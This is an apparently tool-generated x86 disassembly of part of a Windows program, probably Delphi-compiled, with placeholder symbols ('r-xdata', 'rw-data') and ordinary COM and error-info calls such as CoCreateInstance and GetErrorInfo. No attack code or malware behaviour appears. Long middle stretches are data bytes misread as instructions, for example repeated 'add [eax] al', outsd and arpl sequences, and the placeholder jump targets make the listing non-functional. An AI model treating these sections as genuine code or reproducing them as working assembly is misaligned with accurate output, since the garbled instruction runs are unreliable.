movzx edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] dl
mov edx [ eax + 0xc ]
mov [ ebx + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
movzx eax [ eax + 0x28 ]
mov [ ebx + 0x28 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4a25a0
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_47078c
sub eax [ ebx + 0x18 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov esi [ ebx + 0x4 ]
mov eax esi
call sub_47074c
mov ecx eax
sub ecx [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebx + 0xc ]
call sub_40ab90
mov edx esp
mov eax esi
call sub_49ca24
mov edx ebx
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4a25fc
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call sub_4406d0
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
sub_4a2634
push ebx
push esi
push edi
add esp 0xffffffc8
mov edi edx
mov esi eax
xor ebx ebx
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax ebx
add esp 0x38
pop edi
pop esi
pop ebx
retn
call sub_4406d0
test al al
je r-xdata
movzx ebx [ esi + 0x28 ]
test bl bl
jne r-xdata
mov edx esp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_473dd4
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x20 ]
push eax
lea edx [ esp + 0xc ]
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_473dd4
mov eax [ esp + 0x20 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0xc ] eax
lea edx [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ esp + 0x1c ]
sub eax [ esi + 0x18 ]
push eax
lea eax [ esp + 0x2c ]
push eax
mov ecx [ esp + 0x20 ]
sub ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_40ab90
lea esi [ esp + 0x28 ]
lea edi [ esp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx esp
lea eax [ esp + 0x10 ]
call sub_40abd8
test al al
je r-xdata
mov bl 0x1
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
call sub_40abd8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4a2718
push ebx
mov ebx eax
cmp dl [ ebx + 0x8 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x8 ] dl
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x368 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x4 ]
call sub_49c608
sub_4a2748
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
mov [ esi + 0xc ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x10 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x14 ] ecx
inc ecx
jne r-xdata
cmp ecx [ esi + 0x18 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
mov [ esi + 0x18 ] ecx
inc ecx
jne r-xdata
pop esi
retn
mov [ esi + 0x28 ] 0x1
sub_4a27a8
cmp dl [ eax + 0x28 ]
je r-xdata
retn
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ eax + 0x28 ] dl
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ eax + 0xc ] 0xffffffff
je r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
cmp [ eax + 0x14 ] 0xffffffff
je r-xdata
cmp [ eax + 0x18 ] 0xffffffff
je r-xdata
sub_4a27d4
add [ eax ] eax
add [ eax ] al
adc ch bl
dec edx
add [ eax ] ah
test eax 0x46
add [ eax ] al
inc [ rw-data ]
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_49416c
mov eax sub_494454
call sub_42fe9c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_4a2840
add [ eax ] al
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
outsd
jb r-xdata
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
sbb al 0x4b
add [ edx ] bl
inc [ eax ]
add [ eax + ebp + 0x4a ] dl
shr [ eax + ebp + 0x907004a ] 0x45
dec edi
insb
inc ebp
jb r-xdata
[ eax ]
add [ eax ] al
outsd
outsb
je r-xdata
inc eax
adc al [ eax ]
add al [ eax ]
pop es
outsd
add al [ gs : eax ]
add [ eax ] al
add [ eax ] eax
sub [ bp + si ] ecx
inc esp
add ah dh
dec [ eax * 2 + 0x53656c4f ]
jns r-xdata
add [ eax + 0x58004166 ] bh
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
pushfd
adc al [ eax ]
sbb [ eax ] al
add [ eax ] al
or al [ esi + 0x45 ]
jb r-xdata
outsd
jb r-xdata
inc eax
add [ eax + eax ] bl
add [ eax ] al
inc eax
adc al [ eax ]
and [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] bl
add [ eax ] al
pop es
inc esi
push ebx
outsd
jne r-xdata
outsd
add [ eax ] al
add [ edx + ebp + 0x4a ] bh
add [ eax + 0x2b ] ch
dec edx
add [ esi - 0x39ffb5d6 ] dl
sub cl [ edx ]
add [ eax ] al
add [ eax ] al
shr [ edx ] cl
dec edx
add [ eax ] ch
add [ eax ] al
add al dl
sub [ edx ] cl
js r-xdata
add [ eax - 0x80000000 ] al
popad
add al [ gs : bx + si ]
add [ edx + edx + 0xc0040 ] bl
or [ ebp + 0x72 ] eax
jb r-xdata
inc ebp
inc ebp
jb r-xdata
lodsb [ esi ]
sub [ edx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
sub [ edx ] cl
sbb al 0x0
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
sub [ edx ] cl
loopne r-xdata
jb r-xdata
arpl [ ebp + 0x2 ] sp
add [ eax ] al
inc eax
adc al [ eax ]
and [ eax ] al
add [ eax ] al
or [ esi + 0x48 ] eax
insb
jo r-xdata
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
aam 0x58
outsd
je r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
dec edx
add [ eax ] al
add [ eax ] al
add dl dl
sub cl [ edx ]
sub [ eax ] al
add [ eax ] al
shr [ eax ] 0x1
dec edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add al [ eax ]
add al [ eax ]
mov eax eax
int3
jb r-xdata
jb r-xdata
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
outsd
jb r-xdata
outsd
jb r-xdata
inc cx
add [ ecx ] cl
inc ebp
dec edi
insb
inc ebp
jb r-xdata
inc eax
add [ eax ] al
add [ esi ] al
inc ebx
outsd
insd
dec edi
bound ebp [ edx ]
add [ eax ] al
add [ edx ] al
add [ ebx + 0x4a2928c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
sub [ edx ] ecx
xor [ ecx ] ch
dec edx
add [ esi + 0x29 ] cl
dec edx
add [ eax ] al
add [ eax ] al
add [ edx + 0x29 ] bl
dec edx
add [ eax ] ah
add [ eax ] al
add [ eax + ebp ] bh
dec edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
add [ edx ] al
add [ edx ] al
mov edi 0x2004a2b
jb r-xdata
inc eax
add [ edx ] al
add [ edi ] al
dec ebp
jae r-xdata
imul ebp [ ebp + 0x2 ] 0x1000000
add al ah
sub cl [ edx ]
inc esp
add ah dh
dec [ 0x656c4f45 ]
inc ebp
js r-xdata
lodsb [ esi ]
push esi
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add bh al
jo r-xdata
outsd
add al [ gs : eax ]
add [ eax + edx + 0x80040 ] bl
or ecx [ eax + 0x65 ]
insb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4509ffff ] al
jb r-xdata
sub [ edx ] ecx
add al [ eax ]
add al [ eax ]
pushfd
adc al [ eax ]
sbb [ eax ] al
add bh bh
sbb [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
sub [ edx ] ecx
test al 0x28
dec edx
add [ eax ] al
add [ esi ] al
inc ebx
outsd
insd
dec edi
bound ebp [ edx ]
add [ ecx ] al
add [ edx ] al
clc
jb r-xdata
ror ah 0x29
dec edx
add [ edi ] al
or al 0x45
dec edi
insb
push ebx
jns r-xdata
add [ eax + 0x6004a2c ] ch
inc ebx
jb r-xdata
dec edx
add [ edi ] al
outsd
add al [ gs : eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax ] dl
add [ esi ] al
push ebx
outsd
jne r-xdata
add [ edx ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
outsd
insd
dec edi
bound ebp [ edx ]
add [ edx ] al
popad
add al [ gs : bx + si ]
add [ edx + edx + 0x140040 ] bl
or [ ebp + 0x72 ] eax
or al 0x0
or [ eax + 0x65 ] cl
insb
jo r-xdata
jo r-xdata
jb r-xdata
popad
je r-xdata
add [ eax ] al
cmp bh 0xff
push es
push ebx
outsd
jne r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
arpl [ ebp + 0x2 ] sp
add [ eax ] al
inc eax
adc al [ eax ]
add [ edx ] al
pushfd
sub ecx [ edx ]
add al [ eax ]
add bh [ edi + 0x2004a2b ]
imul ebp [ ebp + 0x2 ] 0x109c0000
inc eax
add [ eax ] cl
add [ ebx ] cl
jo r-xdata
or ecx [ eax + 0x65 ]
insb
imul ebp [ edi + 0x6e ] 0x2d7c0081
dec edx
add [ esi ] al
inc ebx
jb r-xdata
dec ebp
jae r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add al 0x0
enter 0x4a29 0x0
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ edx ] al
add [ edi ] al
mov esi eax
mov eax ebx
mov edx esi
call sub_4070a8
mov eax [ ebx ]
call sub_412224
mov esi eax
jmp r-xdata
arpl [ ebp - 0x50 ] sp
add al 0x2
add bh bh
or [ eax ] eax
add [ eax ] al
inc ecx
add [ eax ] dh
popad
add [ edx ] dh
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x4a29 0x0
add [ eax ] al
push es
inc ebx
add al [ eax ]
inc eax
adc al [ eax ]
and [ eax ] al
add bh bh
and [ eax ] al
outsd
outsb
je r-xdata
or [ eax ] al
popad
je r-xdata
mov eax [ ebx ]
call sub_407400
test eax eax
jle r-xdata
insd
add [ ebp ] ah
outsb
add [ eax + eax ] dh
add [ eax - 0xfffdfc ] dh
adc al [ eax ]
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
js r-xdata
dec eax
insb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
push es
add [ ebx + ebp + 0x4a ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
pop esi
pop ebx
retn
movzx eax [ esi ]
sub ax 0x21
jb r-xdata
add [ eax - 0x80000000 ] al
or eax 0x656c4f45
inc ebp
js r-xdata
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
push 0x7004a2b
mov eax [ ebx ]
call sub_407134
mov edx esi
sub edx eax
sar edx 0x1
jns r-xdata
sub ax 0xd
je r-xdata
mov eax ebx
call sub_40740c
mov eax [ ebx ]
call sub_412224
mov esi eax
adc edx 0x0
sub_4a29c9
sub [ edx ] ecx
pop es
or al 0x45
dec edi
insb
push ebx
jns r-xdata
lodsb [ esi ]
push esi
inc ebp
jb r-xdata
jb r-xdata
arpl [ ebp + 0x2 ] sp
add [ eax ] al
inc eax
adc al [ eax ]
and [ eax ] al
add [ eax ] al
or [ esi + 0x48 ] eax
insb
jo r-xdata
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
outsd
jb r-xdata
add [ edx ] al
add [ edx ] al
mov edi 0x2004a2b
jb r-xdata
inc eax
add [ edx ] al
add [ edi ] al
dec ebp
jae r-xdata
imul ebp [ ebp + 0x2 ] 0x1000000
add al ah
sub cl [ edx ]
inc esp
add ah dh
dec [ 0x656c4f45 ]
inc ebp
js r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4509ffff ] al
jb r-xdata
sub [ edx ] ecx
test al 0x28
dec edx
add [ eax ] al
add [ esi ] al
inc ebx
outsd
insd
dec edi
bound ebp [ edx ]
add [ ecx ] al
add [ edx ] al
clc
sub [ edx ] ecx
add al [ eax ]
add al [ eax ]
pushfd
adc al [ eax ]
sbb [ eax ] al
add bh bh
sbb [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ edi ] al
outsd
add al [ gs : eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax ] dl
add [ esi ] al
push ebx
outsd
jne r-xdata
add [ edx ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
outsd
insd
dec edi
bound ebp [ edx ]
add [ edx ] al
popad
add al [ gs : bx + si ]
add [ edx + edx + 0x140040 ] bl
or [ ebp + 0x72 ] eax
or al 0x0
or [ eax + 0x65 ] cl
insb
jo r-xdata
jo r-xdata
inc eax
add [ eax + eax ] bl
add [ eax ] al
inc eax
adc al [ eax ]
and [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] bl
add [ eax ] al
pop es
inc esi
push ebx
outsd
jne r-xdata
outsd
jb r-xdata
add [ eax ] al
cmp bh 0xff
push es
push ebx
outsd
jne r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
arpl [ ebp + 0x2 ] sp
add [ eax ] al
inc eax
adc al [ eax ]
add [ edx ] al
pushfd
sub ecx [ edx ]
add al [ eax ]
add bh [ edi + 0x2004a2b ]
imul ebp [ ebp + 0x2 ] 0x109c0000
inc eax
add [ eax ] cl
add [ ebx ] cl
jo r-xdata
or ecx [ eax + 0x65 ]
insb
imul ebp [ edi + 0x6e ] 0x2d7c0081
dec edx
add [ esi ] al
inc ebx
jb r-xdata
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
aam 0x58
outsd
je r-xdata
mov esi eax
mov eax ebx
mov edx esi
call sub_4070a8
mov eax [ ebx ]
call sub_412224
mov esi eax
jmp r-xdata
arpl [ ebp - 0x50 ] sp
add al 0x2
add bh bh
or [ eax ] eax
add [ eax ] al
inc ecx
add [ eax ] dh
popad
add [ edx ] dh
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x4a29 0x0
add [ eax ] al
push es
inc ebx
add al [ eax ]
inc eax
adc al [ eax ]
and [ eax ] al
add bh bh
and [ eax ] al
outsd
outsb
je r-xdata
or [ eax ] al
popad
je r-xdata
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x4a ] bh
add [ eax + 0x2b ] ch
dec edx
add [ esi - 0x39ffb5d6 ] dl
sub cl [ edx ]
add [ eax ] al
add [ eax ] al
shr [ edx ] cl
dec edx
add [ eax ] ch
add [ eax ] al
add al dl
sub [ edx ] cl
mov eax [ ebx ]
call sub_407400
test eax eax
jle r-xdata
insd
add [ ebp ] ah
outsb
add [ eax + eax ] dh
add [ eax - 0xfffdfc ] dh
adc al [ eax ]
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
js r-xdata
dec eax
insb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
push es
add [ ebx + ebp + 0x4a ] ah
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
pop esi
pop ebx
retn
movzx eax [ esi ]
sub ax 0x21
jb r-xdata
add [ eax - 0x80000000 ] al
or eax 0x656c4f45
inc ebp
js r-xdata
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
push 0x7004a2b
mov eax [ ebx ]
call sub_407134
mov edx esi
sub edx eax
sar edx 0x1
jns r-xdata
sub ax 0xd
je r-xdata
mov eax ebx
call sub_40740c
mov eax [ ebx ]
call sub_412224
mov esi eax
adc edx 0x0
sub_4a2c4c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_4070a8
mov eax [ ebx ]
call sub_412224
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_407400
test eax eax
jle r-xdata
pop esi
pop ebx
retn
movzx eax [ esi ]
sub ax 0x21
jb r-xdata
mov eax [ ebx ]
call sub_407134
mov edx esi
sub edx eax
sar edx 0x1
jns r-xdata
sub ax 0xd
je r-xdata
mov eax ebx
call sub_40740c
mov eax [ ebx ]
call sub_412224
mov esi eax
adc edx 0x0
sub_4a2ca8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4a2d52
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4070fc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_416344
mov [ ebx + 0x18 ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a2d59
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_415718
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_40a204
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
call sub_412a08
sub_4a2d59
mov eax ebx
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4a2d7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4a2dee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4a2c4c
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_4a2ca8
lea eax [ edi + 0x1c ]
mov edx [ ebp + 0x10 ]
call sub_4070a8
lea eax [ edi + 0x20 ]
mov edx [ ebp + 0xc ]
call sub_4070a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a2df5
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
add esp 0xfffffff0
call sub_405b0c
sub_4a2df5
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4a2e40
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_4a2e30
mov eax esi
mov edx [ esp ]
call sub_407254
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_4a2e6c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x20 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4a2f4c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_405e48
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_409cb4
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call CoCreateInstance
call sub_4a2e30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a2f53
lea eax [ ebp - 0x20 ]
call j_sub_4068a0
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
sub_4a2f98
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
sub_4a311c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4a3205
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_409cb4
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4072f8
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_4072f8
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4072f8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a2d7c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a320c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call j_sub_4068c4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_406d6c
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
lea eax [ ebp - 0x8 ]
call sub_406d54
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_406d54
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_406d54
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_4a3224
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x28 ] ecx
mov esi edx
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_407d18
xor eax eax
push ebp
push sub_4a354f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x30 ] eax
xor ecx ecx
push ebp
push sub_4a352c
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x4
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] edi
movzx eax [ esi + 0x2 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
movzx eax [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x38 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0x2c ] 0x48
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x38 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x50 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x4c ] 0x4
inc [ ebp - 0x44 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x30 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x3c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x30 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x20 ]
call sub_4a3800
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x2c ] 0xc
jne r-xdata
cmp [ ebp - 0x2c ] 0xc
jne r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
call sub_408220
mov edx [ ebp - 0x3c ]
mov [ edx ] eax
mov eax [ ebp - 0x3c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x3c ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
